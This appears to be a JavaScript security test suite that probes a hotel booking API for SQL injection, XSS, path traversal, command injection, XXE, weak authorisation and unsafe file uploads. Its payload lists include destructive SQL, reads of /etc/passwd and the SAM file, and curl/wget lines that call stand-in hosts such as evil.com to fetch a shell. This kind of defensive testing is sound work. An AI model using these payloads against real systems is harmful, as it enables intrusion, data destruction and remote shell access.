// Security Test Suite for Hotel Booking System
// 史上最強のセキュリティテスト - worker4実装
// Created: 2025-06-29

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SecurityTestSuite {
    constructor(config = {}) {
        this.config = {
            baseUrl: config.baseUrl || 'http://localhost:8080',
            timeout: config.timeout || 30000,
            maxConcurrent: config.maxConcurrent || 5,
            retryAttempts: config.retryAttempts || 3,
            outputFormat: config.outputFormat || 'json', // json, html, txt
            reportPath: config.reportPath || './security-test-report',
            ...config
        };
        
        this.results = {
            summary: {
                total: 0,
                passed: 0,
                failed: 0,
                warnings: 0,
                skipped: 0,
                startTime: null,
                endTime: null,
                duration: 0
            },
            tests: []
        };
        
        this.payloads = this.initializePayloads();
    }

    // 🚀 Initialize Test Payloads
    initializePayloads() {
        return {
            sqlInjection: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "1' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
                "' OR 1=1#",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "'; WAITFOR DELAY '00:00:05' --",
                "1'; SELECT SLEEP(5); --"
            ],
            xss: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>"
            ],
            pathTraversal: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..\\..\\..\\boot.ini",
                "../../../proc/self/environ",
                "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
            ],
            commandInjection: [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "`id`",
                "$(whoami)",
                "; ping -c 4 127.0.0.1",
                "| netstat -an",
                "&& curl attacker.com",
                "; wget http://evil.com/shell.php",
                "| powershell -enc SQBFAFgA"
            ],
            ldapInjection: [
                "*",
                "*)(&",
                "*))%00",
                "*()|&'",
                "admin*)((|userPassword=*)",
                "*)(uid=*))(|(uid=*",
                "admin*)(|(password=*))",
                "*)(cn=*))(|(cn=*"
            ],
            xmlInjection: [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>"
            ],
            hotelSpecific: [
                "price=-99999",
                "room_id=../../../admin",
                "user_id=1 UNION SELECT password FROM admin_users",
                "discount_code='; UPDATE bookings SET price=0 WHERE id=1; --",
                "checkin_date=2024-01-01' OR '1'='1",
                "hotel_id=1; DELETE FROM hotels; --"
            ]
        };
    }

    // 🧪 Run All Tests
    async runAllTests() {
        console.log('🚀 Starting Security Test Suite...');
        this.results.summary.startTime = new Date().toISOString();
        
        const tests = [
            { name: 'SQL Injection Tests', method: this.testSQLInjection.bind(this) },
            { name: 'XSS Tests', method: this.testXSS.bind(this) },
            { name: 'Path Traversal Tests', method: this.testPathTraversal.bind(this) },
            { name: 'Command Injection Tests', method: this.testCommandInjection.bind(this) },
            { name: 'Authentication Tests', method: this.testAuthentication.bind(this) },
            { name: 'Authorization Tests', method: this.testAuthorization.bind(this) },
            { name: 'Rate Limiting Tests', method: this.testRateLimiting.bind(this) },
            { name: 'Input Validation Tests', method: this.testInputValidation.bind(this) },
            { name: 'Session Management Tests', method: this.testSessionManagement.bind(this) },
            { name: 'HTTPS/TLS Tests', method: this.testHTTPS.bind(this) },
            { name: 'Security Headers Tests', method: this.testSecurityHeaders.bind(this) },
            { name: 'File Upload Tests', method: this.testFileUpload.bind(this) },
            { name: 'API Security Tests', method: this.testAPISecurity.bind(this) },
            { name: 'Hotel Specific Tests', method: this.testHotelSpecific.bind(this) }
        ];
        
        for (const test of tests) {
            console.log(`\n🧪 Running ${test.name}...`);
            try {
                await test.method();
            } catch (error) {
                this.addTestResult(test.name, 'FAILED', `Test suite failed: ${error.message}`, 'CRITICAL');
            }
        }
        
        this.results.summary.endTime = new Date().toISOString();
        this.results.summary.duration = new Date(this.results.summary.endTime) - new Date(this.results.summary.startTime);
        
        console.log('\n📊 Generating report...');
        await this.generateReport();
        
        console.log('✅ Security Test Suite completed!');
        return this.results;
    }

    // 💉 SQL Injection Tests
    async testSQLInjection() {
        const endpoints = [
            { path: '/api/search', method: 'GET', params: ['q', 'location', 'hotel_id'] },
            { path: '/api/auth/login', method: 'POST', params: ['email', 'password'] },
            { path: '/api/bookings', method: 'GET', params: ['user_id', 'hotel_id'] },
            { path: '/api/hotels', method: 'GET', params: ['id', 'category'] }
        ];
        
        for (const endpoint of endpoints) {
            for (const param of endpoint.params) {
                for (const payload of this.payloads.sqlInjection) {
                    await this.testPayload(
                        `SQL Injection - ${endpoint.path} (${param})`,
                        endpoint,
                        param,
                        payload,
                        'CRITICAL'
                    );
                }
            }
        }
    }

    // 🖥️ XSS Tests
    async testXSS() {
        const endpoints = [
            { path: '/api/search', method: 'GET', params: ['q', 'location'] },
            { path: '/api/reviews', method: 'POST', params: ['comment', 'title'] },
            { path: '/api/profile', method: 'PUT', params: ['name', 'bio'] }
        ];
        
        for (const endpoint of endpoints) {
            for (const param of endpoint.params) {
                for (const payload of this.payloads.xss) {
                    await this.testPayload(
                        `XSS - ${endpoint.path} (${param})`,
                        endpoint,
                        param,
                        payload,
                        'HIGH'
                    );
                }
            }
        }
    }

    // 📁 Path Traversal Tests
    async testPathTraversal() {
        const endpoints = [
            { path: '/api/files', method: 'GET', params: ['filename', 'path'] },
            { path: '/api/images', method: 'GET', params: ['image', 'url'] },
            { path: '/api/documents', method: 'GET', params: ['doc'] }
        ];
        
        for (const endpoint of endpoints) {
            for (const param of endpoint.params) {
                for (const payload of this.payloads.pathTraversal) {
                    await this.testPayload(
                        `Path Traversal - ${endpoint.path} (${param})`,
                        endpoint,
                        param,
                        payload,
                        'HIGH'
                    );
                }
            }
        }
    }

    // ⚡ Command Injection Tests
    async testCommandInjection() {
        const endpoints = [
            { path: '/api/utils/ping', method: 'POST', params: ['host'] },
            { path: '/api/system/info', method: 'GET', params: ['command'] }
        ];
        
        for (const endpoint of endpoints) {
            for (const param of endpoint.params) {
                for (const payload of this.payloads.commandInjection) {
                    await this.testPayload(
                        `Command Injection - ${endpoint.path} (${param})`,
                        endpoint,
                        param,
                        payload,
                        'CRITICAL'
                    );
                }
            }
        }
    }

    // 🔐 Authentication Tests
    async testAuthentication() {
        // Test login endpoint
        const loginTests = [
            { name: 'Empty credentials', data: { email: '', password: '' } },
            { name: 'SQL injection in email', data: { email: "admin'--", password: 'test' } },
            { name: 'Long password attack', data: { email: 'test@test.com', password: 'A'.repeat(10000) } },
            { name: 'Null bytes', data: { email: 'test@test.com\x00', password: 'password' } },
            { name: 'Unicode normalization', data: { email: 'tëst@test.com', password: 'pässwörd' } }
        ];
        
        for (const test of loginTests) {
            try {
                const response = await this.makeRequest('POST', '/api/auth/login', {}, test.data);
                
                if (response.status === 200 && response.data.token) {
                    this.addTestResult(
                        `Authentication - ${test.name}`,
                        'FAILED',
                        'Authentication bypass detected',
                        'CRITICAL'
                    );
                } else if (response.status >= 400) {
                    this.addTestResult(
                        `Authentication - ${test.name}`,
                        'PASSED',
                        'Properly rejected invalid credentials',
                        'INFO'
                    );
                }
            } catch (error) {
                this.addTestResult(
                    `Authentication - ${test.name}`,
                    'WARNING',
                    `Unexpected error: ${error.message}`,
                    'MEDIUM'
                );
            }
        }
    }

    // 🛡️ Authorization Tests
    async testAuthorization() {
        const protectedEndpoints = [
            '/api/admin/users',
            '/api/admin/hotels',
            '/api/admin/bookings',
            '/api/user/profile',
            '/api/bookings/my'
        ];
        
        for (const endpoint of protectedEndpoints) {
            // Test without token
            try {
                const response = await this.makeRequest('GET', endpoint);
                
                if (response.status === 200) {
                    this.addTestResult(
                        `Authorization - ${endpoint} (no token)`,
                        'FAILED',
                        'Endpoint accessible without authentication',
                        'HIGH'
                    );
                } else if (response.status === 401 || response.status === 403) {
                    this.addTestResult(
                        `Authorization - ${endpoint} (no token)`,
                        'PASSED',
                        'Properly requires authentication',
                        'INFO'
                    );
                }
            } catch (error) {
                // Expected for protected endpoints
                this.addTestResult(
                    `Authorization - ${endpoint} (no token)`,
                    'PASSED',
                    'Properly requires authentication',
                    'INFO'
                );
            }
            
            // Test with invalid token
            try {
                const response = await this.makeRequest('GET', endpoint, {
                    'Authorization': 'Bearer invalid_token_12345'
                });
                
                if (response.status === 200) {
                    this.addTestResult(
                        `Authorization - ${endpoint} (invalid token)`,
                        'FAILED',
                        'Endpoint accessible with invalid token',
                        'HIGH'
                    );
                } else {
                    this.addTestResult(
                        `Authorization - ${endpoint} (invalid token)`,
                        'PASSED',
                        'Properly validates token',
                        'INFO'
                    );
                }
            } catch (error) {
                this.addTestResult(
                    `Authorization - ${endpoint} (invalid token)`,
                    'PASSED',
                    'Properly validates token',
                    'INFO'
                );
            }
        }
    }

    // ⏱️ Rate Limiting Tests
    async testRateLimiting() {
        const endpoints = [
            '/api/auth/login',
            '/api/search',
            '/api/bookings'
        ];
        
        for (const endpoint of endpoints) {
            const requests = [];
            const testName = `Rate Limiting - ${endpoint}`;
            
            // Send multiple requests quickly
            for (let i = 0; i < 20; i++) {
                requests.push(this.makeRequest('GET', endpoint).catch(e => e));
            }
            
            try {
                const responses = await Promise.all(requests);
                const rateLimited = responses.some(r => r.status === 429);
                
                if (rateLimited) {
                    this.addTestResult(testName, 'PASSED', 'Rate limiting active', 'INFO');
                } else {
                    this.addTestResult(testName, 'WARNING', 'No rate limiting detected', 'MEDIUM');
                }
            } catch (error) {
                this.addTestResult(testName, 'WARNING', `Rate limiting test failed: ${error.message}`, 'MEDIUM');
            }
        }
    }

    // ✅ Input Validation Tests
    async testInputValidation() {
        const invalidInputs = [
            { name: 'Extremely long string', value: 'A'.repeat(100000) },
            { name: 'Null bytes', value: 'test\x00value' },
            { name: 'Unicode overflow', value: '\uFFFF'.repeat(1000) },
            { name: 'Negative numbers', value: '-999999' },
            { name: 'Scientific notation', value: '1e999' },
            { name: 'Special characters', value: '!@#$%^&*()_+{}[]|\\:";\'<>?,./' }
        ];
        
        const endpoints = [
            { path: '/api/search', method: 'GET', param: 'q' },
            { path: '/api/hotels', method: 'GET', param: 'category' }
        ];
        
        for (const endpoint of endpoints) {
            for (const input of invalidInputs) {
                try {
                    const params = { [endpoint.param]: input.value };
                    const response = await this.makeRequest(endpoint.method, endpoint.path, {}, null, params);
                    
                    if (response.status >= 400) {
                        this.addTestResult(
                            `Input Validation - ${endpoint.path} (${input.name})`,
                            'PASSED',
                            'Invalid input properly rejected',
                            'INFO'
                        );
                    } else {
                        this.addTestResult(
                            `Input Validation - ${endpoint.path} (${input.name})`,
                            'WARNING',
                            'Invalid input accepted',
                            'MEDIUM'
                        );
                    }
                } catch (error) {
                    this.addTestResult(
                        `Input Validation - ${endpoint.path} (${input.name})`,
                        'WARNING',
                        `Validation test error: ${error.message}`,
                        'LOW'
                    );
                }
            }
        }
    }

    // 🍪 Session Management Tests
    async testSessionManagement() {
        // Test session fixation
        try {
            const response1 = await this.makeRequest('GET', '/api/health');
            const sessionId1 = response1.headers['set-cookie']?.[0];
            
            const response2 = await this.makeRequest('GET', '/api/health');
            const sessionId2 = response2.headers['set-cookie']?.[0];
            
            if (sessionId1 && sessionId1 === sessionId2) {
                this.addTestResult(
                    'Session Management - Session Fixation',
                    'FAILED',
                    'Same session ID reused',
                    'HIGH'
                );
            } else {
                this.addTestResult(
                    'Session Management - Session Fixation',
                    'PASSED',
                    'Session IDs properly randomized',
                    'INFO'
                );
            }
        } catch (error) {
            this.addTestResult(
                'Session Management - Session Fixation',
                'SKIPPED',
                'Could not test session management',
                'LOW'
            );
        }
    }

    // 🔒 HTTPS/TLS Tests
    async testHTTPS() {
        try {
            // Test HTTP to HTTPS redirect
            const httpUrl = this.config.baseUrl.replace('https://', 'http://');
            const response = await this.makeRequest('GET', '/', {}, null, null, httpUrl);
            
            if (response.status >= 300 && response.status < 400) {
                this.addTestResult(
                    'HTTPS - HTTP Redirect',
                    'PASSED',
                    'HTTP properly redirects to HTTPS',
                    'INFO'
                );
            } else {
                this.addTestResult(
                    'HTTPS - HTTP Redirect',
                    'WARNING',
                    'HTTP does not redirect to HTTPS',
                    'MEDIUM'
                );
            }
        } catch (error) {
            this.addTestResult(
                'HTTPS - HTTP Redirect',
                'SKIPPED',
                'Could not test HTTPS redirect',
                'LOW'
            );
        }
    }

    // 🛡️ Security Headers Tests
    async testSecurityHeaders() {
        const requiredHeaders = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ];
        
        try {
            const response = await this.makeRequest('GET', '/');
            
            for (const header of requiredHeaders) {
                if (response.headers[header.toLowerCase()]) {
                    this.addTestResult(
                        `Security Headers - ${header}`,
                        'PASSED',
                        `Header present: ${response.headers[header.toLowerCase()]}`,
                        'INFO'
                    );
                } else {
                    this.addTestResult(
                        `Security Headers - ${header}`,
                        'WARNING',
                        'Security header missing',
                        'MEDIUM'
                    );
                }
            }
        } catch (error) {
            this.addTestResult(
                'Security Headers',
                'SKIPPED',
                'Could not test security headers',
                'LOW'
            );
        }
    }

    // 📤 File Upload Tests
    async testFileUpload() {
        const maliciousFiles = [
            { name: 'test.php', content: '<?php echo "PHP executed"; ?>', type: 'application/x-php' },
            { name: 'test.jsp', content: '<% out.println("JSP executed"); %>', type: 'application/x-jsp' },
            { name: 'test.exe', content: 'MZ', type: 'application/x-msdownload' },
            { name: '../../../test.txt', content: 'Path traversal test', type: 'text/plain' }
        ];
        
        for (const file of maliciousFiles) {
            try {
                const formData = new FormData();
                formData.append('file', new Blob([file.content], { type: file.type }), file.name);
                
                const response = await this.makeRequest('POST', '/api/upload', {
                    'Content-Type': 'multipart/form-data'
                }, formData);
                
                if (response.status === 200) {
                    this.addTestResult(
                        `File Upload - ${file.name}`,
                        'FAILED',
                        'Malicious file upload accepted',
                        'HIGH'
                    );
                } else {
                    this.addTestResult(
                        `File Upload - ${file.name}`,
                        'PASSED',
                        'Malicious file upload rejected',
                        'INFO'
                    );
                }
            } catch (error) {
                this.addTestResult(
                    `File Upload - ${file.name}`,
                    'WARNING',
                    `Upload test failed: ${error.message}`,
                    'LOW'
                );
            }
        }
    }

    // 🔌 API Security Tests
    async testAPISecurity() {
        // Test for mass assignment
        const massAssignmentPayload = {
            name: 'Test User',
            email: 'test@test.com',
            role: 'admin',
            is_admin: true,
            permissions: ['all']
        };
        
        try {
            const response = await this.makeRequest('POST', '/api/users', {}, massAssignmentPayload);
            
            if (response.status === 200 && response.data.role === 'admin') {
                this.addTestResult(
                    'API Security - Mass Assignment',
                    'FAILED',
                    'Mass assignment vulnerability detected',
                    'HIGH'
                );
            } else {
                this.addTestResult(
                    'API Security - Mass Assignment',
                    'PASSED',
                    'Mass assignment properly prevented',
                    'INFO'
                );
            }
        } catch (error) {
            this.addTestResult(
                'API Security - Mass Assignment',
                'SKIPPED',
                'Could not test mass assignment',
                'LOW'
            );
        }
    }

    // 🏨 Hotel Specific Tests
    async testHotelSpecific() {
        for (const payload of this.payloads.hotelSpecific) {
            const testName = `Hotel Security - ${payload.substring(0, 30)}...`;
            
            try {
                const response = await this.makeRequest('GET', '/api/search', {}, null, { q: payload });
                
                if (response.status >= 400) {
                    this.addTestResult(testName, 'PASSED', 'Malicious input rejected', 'INFO');
                } else {
                    this.addTestResult(testName, 'WARNING', 'Potentially vulnerable to business logic attacks', 'MEDIUM');
                }
            } catch (error) {
                this.addTestResult(testName, 'WARNING', `Test failed: ${error.message}`, 'LOW');
            }
        }
    }

    // 🚀 Test Payload Helper
    async testPayload(testName, endpoint, param, payload, severity) {
        try {
            let response;
            
            if (endpoint.method === 'GET') {
                const params = { [param]: payload };
                response = await this.makeRequest('GET', endpoint.path, {}, null, params);
            } else {
                const data = { [param]: payload };
                response = await this.makeRequest(endpoint.method, endpoint.path, {}, data);
            }
            
            // Check for successful injection
            if (response.status === 200) {
                const responseText = JSON.stringify(response.data).toLowerCase();
                
                // Check for SQL error messages
                const sqlErrors = ['mysql', 'postgres', 'oracle', 'sql syntax', 'sql error', 'sqlite'];
                const hasError = sqlErrors.some(error => responseText.includes(error));
                
                if (hasError) {
                    this.addTestResult(testName, 'FAILED', 'SQL injection vulnerability detected', severity);
                } else {
                    this.addTestResult(testName, 'PASSED', 'Payload rejected or filtered', 'INFO');
                }
            } else if (response.status >= 400) {
                this.addTestResult(testName, 'PASSED', 'Payload properly rejected', 'INFO');
            }
            
        } catch (error) {
            if (error.response && error.response.status >= 400) {
                this.addTestResult(testName, 'PASSED', 'Payload properly rejected', 'INFO');
            } else {
                this.addTestResult(testName, 'WARNING', `Test error: ${error.message}`, 'LOW');
            }
        }
    }

    // 🌐 Make HTTP Request
    async makeRequest(method, path, headers = {}, data = null, params = null, baseUrl = null) {
        const config = {
            method,
            url: `${baseUrl || this.config.baseUrl}${path}`,
            headers: {
                'User-Agent': 'SecurityTestSuite/1.0',
                ...headers
            },
            timeout: this.config.timeout,
            validateStatus: () => true // Don't throw on 4xx/5xx
        };
        
        if (params) {
            config.params = params;
        }
        
        if (data) {
            config.data = data;
        }
        
        return await axios(config);
    }

    // 📝 Add Test Result
    addTestResult(name, status, message, severity) {
        const result = {
            name,
            status,
            message,
            severity,
            timestamp: new Date().toISOString()
        };
        
        this.results.tests.push(result);
        this.results.summary.total++;
        
        switch (status) {
            case 'PASSED':
                this.results.summary.passed++;
                console.log(`  ✅ ${name}: ${message}`);
                break;
            case 'FAILED':
                this.results.summary.failed++;
                console.log(`  ❌ ${name}: ${message}`);
                break;
            case 'WARNING':
                this.results.summary.warnings++;
                console.log(`  ⚠️  ${name}: ${message}`);
                break;
            case 'SKIPPED':
                this.results.summary.skipped++;
                console.log(`  ⏭️  ${name}: ${message}`);
                break;
        }
    }

    // 📊 Generate Report
    async generateReport() {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        
        // JSON Report
        const jsonReport = JSON.stringify(this.results, null, 2);
        fs.writeFileSync(`${this.config.reportPath}-${timestamp}.json`, jsonReport);
        
        // HTML Report
        const htmlReport = this.generateHTMLReport();
        fs.writeFileSync(`${this.config.reportPath}-${timestamp}.html`, htmlReport);
        
        // Text Summary
        const textReport = this.generateTextReport();
        fs.writeFileSync(`${this.config.reportPath}-${timestamp}.txt`, textReport);
        
        console.log(`\n📋 Reports generated:`);
        console.log(`  📄 JSON: ${this.config.reportPath}-${timestamp}.json`);
        console.log(`  🌐 HTML: ${this.config.reportPath}-${timestamp}.html`);
        console.log(`  📝 Text: ${this.config.reportPath}-${timestamp}.txt`);
    }

    // 🌐 Generate HTML Report
    generateHTMLReport() {
        const summary = this.results.summary;
        const tests = this.results.tests;
        
        return `
<!DOCTYPE html>
<html>
<head>
    <title>Security Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .summary { background: #f5f5f5; padding: 20px; margin-bottom: 20px; border-radius: 5px; }
        .test-result { margin: 10px 0; padding: 10px; border-radius: 3px; }
        .passed { background: #d4edda; border-left: 4px solid #28a745; }
        .failed { background: #f8d7da; border-left: 4px solid #dc3545; }
        .warning { background: #fff3cd; border-left: 4px solid #ffc107; }
        .skipped { background: #e2e3e5; border-left: 4px solid #6c757d; }
        .severity { font-weight: bold; float: right; }
        .critical { color: #dc3545; }
        .high { color: #fd7e14; }
        .medium { color: #ffc107; }
        .low { color: #17a2b8; }
        .info { color: #28a745; }
    </style>
</head>
<body>
    <h1>🛡️ Security Test Report</h1>
    
    <div class="summary">
        <h2>📊 Summary</h2>
        <p><strong>Total Tests:</strong> ${summary.total}</p>
        <p><strong>Passed:</strong> ${summary.passed}</p>
        <p><strong>Failed:</strong> ${summary.failed}</p>
        <p><strong>Warnings:</strong> ${summary.warnings}</p>
        <p><strong>Skipped:</strong> ${summary.skipped}</p>
        <p><strong>Duration:</strong> ${Math.round(summary.duration / 1000)}s</p>
        <p><strong>Start Time:</strong> ${summary.startTime}</p>
        <p><strong>End Time:</strong> ${summary.endTime}</p>
    </div>
    
    <h2>🧪 Test Results</h2>
    ${tests.map(test => `
        <div class="test-result ${test.status.toLowerCase()}">
            <strong>${test.name}</strong>
            <span class="severity ${test.severity.toLowerCase()}">${test.severity}</span>
            <br>
            <small>${test.message}</small>
            <br>
            <small style="color: #666;">${test.timestamp}</small>
        </div>
    `).join('')}
</body>
</html>`;
    }

    // 📝 Generate Text Report
    generateTextReport() {
        const summary = this.results.summary;
        const tests = this.results.tests;
        
        let report = '🛡️ SECURITY TEST REPORT\n';
        report += '='.repeat(50) + '\n\n';
        
        report += '📊 SUMMARY\n';
        report += `-`.repeat(20) + '\n';
        report += `Total Tests: ${summary.total}\n`;
        report += `Passed: ${summary.passed}\n`;
        report += `Failed: ${summary.failed}\n`;
        report += `Warnings: ${summary.warnings}\n`;
        report += `Skipped: ${summary.skipped}\n`;
        report += `Duration: ${Math.round(summary.duration / 1000)}s\n`;
        report += `Start Time: ${summary.startTime}\n`;
        report += `End Time: ${summary.endTime}\n\n`;
        
        report += '🧪 TEST RESULTS\n';
        report += `-`.repeat(20) + '\n';
        
        for (const test of tests) {
            const icon = {
                'PASSED': '✅',
                'FAILED': '❌',
                'WARNING': '⚠️',
                'SKIPPED': '⏭️'
            }[test.status];
            
            report += `${icon} ${test.name} [${test.severity}]\n`;
            report += `   ${test.message}\n`;
            report += `   ${test.timestamp}\n\n`;
        }
        
        return report;
    }
}

module.exports = SecurityTestSuite;